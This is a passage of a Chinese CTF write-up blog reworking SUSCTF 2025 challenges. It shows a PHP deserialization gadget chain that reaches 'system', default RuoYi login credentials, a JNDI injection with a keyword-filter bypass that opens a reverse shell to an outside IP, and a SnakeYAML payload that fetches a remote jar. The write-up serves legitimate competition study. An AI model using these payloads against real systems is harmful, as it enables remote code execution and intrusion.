class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">TCPDF</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">file_id</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$imagekeys</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;<span class="variable language_">$this</span>-&gt;file_id=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;imagekeys=<span class="keyword">new</span> <span class="title class_">Give\Vendors\Symfony\Component\HttpFoundation\Session\Session</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Give</span>\<span class="title class_">Vendors</span>\<span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">HttpFoundation</span>\<span class="title class_">Session</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Session</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">attributeName</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$storage</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;storage = <span class="keyword">new</span> <span class="title class_">\Give\TestData\Factories\DonationFactory</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributeName = <span class="string">&quot;env&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Give</span>\<span class="title class_">TestData</span>\<span class="title class_">Factories</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DonationFactory</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">loadedProviders</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;loadedProviders=[];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;loadedProviders[<span class="string">&#x27;getBag&#x27;</span>]=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">TCPDF</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251014135210090.png" alt="image-20251014135210090" /></p>
+<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
+<h3 id="01-all-u-need"><a class="markdownIt-Anchor" href="#01-all-u-need"></a> 01-All U Need</h3>
+<p>题目给出了n,c,e</p>
+<h2 id="pentest"><a class="markdownIt-Anchor" href="#pentest"></a> Pentest</h2>
+<p>竟然看到了渗透题</p>
+<h3 id="pen4ruo1-1jndi注入"><a class="markdownIt-Anchor" href="#pen4ruo1-1jndi注入"></a> pen4ruo1-1(JNDI注入)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line">jndi注入 + bypass</span><br><span class="line">SnackYaml反序列化</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251014135634606.png" alt="image-20251014135634606" /></p>
+<p>进入之后：</p>
+<p><img src="../images/image-20251014140035613.png" alt="image-20251014140035613" /></p>
+<p>很明显是个若依系统</p>
+<p>若依系统是存在弱口令的例如，默认用户名 <code>ry/ruoyi/admin</code>，默认密码 <code>admin/admin123/ruoyi/123456</code> 等等，在当前靶场的用户名密码为 <code>ry/admin123</code></p>
+<p>登录成功：</p>
+<p><img src="../images/image-20251014140333136.png" alt="image-20251014140333136" /></p>
+<p>根据提示的定时任务找到</p>
+<p><img src="../images/image-20251014141453569.png" alt="image-20251014141453569" /></p>
+<p>在网上找到这部分的漏洞：<br />
+<img src="../images/image-20251014141938316.png" alt="image-20251014141938316" /></p>
+<p>尝试使用DSN解析测试是否存在漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup(&#x27;ldap://eesqi8.dnslog.cn&#x27;)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251014142024389.png" alt="image-20251014142024389" /></p>
+<p>关键字过滤</p>
+<p>不中了，这咋办</p>
+<p>看题解：<br />
+<img src="../images/image-20251014142400221.png" alt="image-20251014142400221" /></p>
+<p>我们也执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup(&#x27;ld&#x27;ap://8.148.211.47:1389/Basic/ReverseShell/8.148.211.47/9999&#x27;)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251014143723155.png" alt="image-20251014143723155" /></p>
+<p>确定之后启动状态，执行ldap注入</p>
+<p><img src="../images/image-20251014143841008.png" alt="image-20251014143841008" /></p>
+<p><img src="../images/image-20251014143902605.png" alt="image-20251014143902605" /></p>
+<p>但其实这里也存在SnackYaml反序列化漏洞</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;h\x74tp://xx.xx.xx.xx:xxxx/yamlpayload.jar&quot;</span>]]]]<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">org.yaml.snakeyaml.Yaml.load(&#x27;</span><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;ht&#x27;tp://**.**.***.**:***/yamlpayload.jar&quot;</span>]]]]<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p>使用该链接的源代码编译生成相应的 jar 包 <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<h3 id="pen4ruo1-2"><a class="markdownIt-Anchor" href="#pen4ruo1-2"></a> pen4ruo1-2</h3>
+<p><a target="_blank" rel="noopener" href="https://seusus.com/susctf-2025-official-writeup/#pentest">SUSCTF@2025 主赛道 官方 writeup</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PHP%E5%86%85%E7%BD%AE%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">PHP内置接口反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Python%E7%9A%84PostgreSQL%E6%B3%A8%E5%85%A5/" rel="tag">Python的PostgreSQL注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/bg1.jpg" data-sizes="auto" alt="Hgame2024Week4复现" class="lazyload">
+          
+        
+        <a href="/2025/10/14/Hgame2024Week4%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            Hgame2024Week4复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="羊城杯2025初赛复现" class="lazyload">
+        
+      
+      <a href="/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          羊城杯2025初赛复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin"><span class="toc-number">1.1.</span> <span class="toc-text"> am i admin?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin-2"><span class="toc-number">1.2.</span> <span class="toc-text"> am i admin? 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyprintpdfkitcve-2025-26240"><span class="toc-number">1.3.</span> <span class="toc-text"> easyprint（pdfkit—CVE-2025-26240）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#susmarketpython%E7%9A%84postgresql%E6%B3%A8%E5%85%A5%E5%90%8E%E5%8D%87%E7%BA%A7%E4%B8%BArce"><span class="toc-number">1.4.</span> <span class="toc-text"> SUSMarket(Python的PostgreSQL注入，后升级为RCE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#make-php-greater-againphp%E5%86%85%E7%BD%AE%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text"> make php greater again(PHP内置接口反序列化)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 找链子</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-all-u-need"><span class="toc-number">2.1.</span> <span class="toc-text"> 01-All U Need</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pentest"><span class="toc-number">3.</span> <span class="toc-text"> Pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-1jndi%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text"> pen4ruo1-1(JNDI注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-2"><span class="toc-number">3.2.</span> <span class="toc-text"> pen4ruo1-2</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "SUSCTF2025题目复现",
+          url: "http://example.com/2025/10/14/SUSCTF2025%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "不中了，签到题是go，我没学过… [TOC]  Web  am i admin? 直接放官方题解了   am i admin? 2   easyprint（pdfkit—CVE-2025-26240） 唯一做出来的一个题 该题是一个html转pdf的工具 一眼扫到了一个主要依赖  直接搜漏洞，找到CVE-2025-26240 直接能进行外带文件读取: 123456&amp;lt;meta name=&amp;#x27;pdfkit---quiet&amp;#x27; content=&amp;#x27;&amp;#x27;&amp;gt;&amp;l",
+          date: "Tue Oct 14 2025 10:58:57 GMT+0800",
+          updated: "Wed Dec 10 2025 16:16:04 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
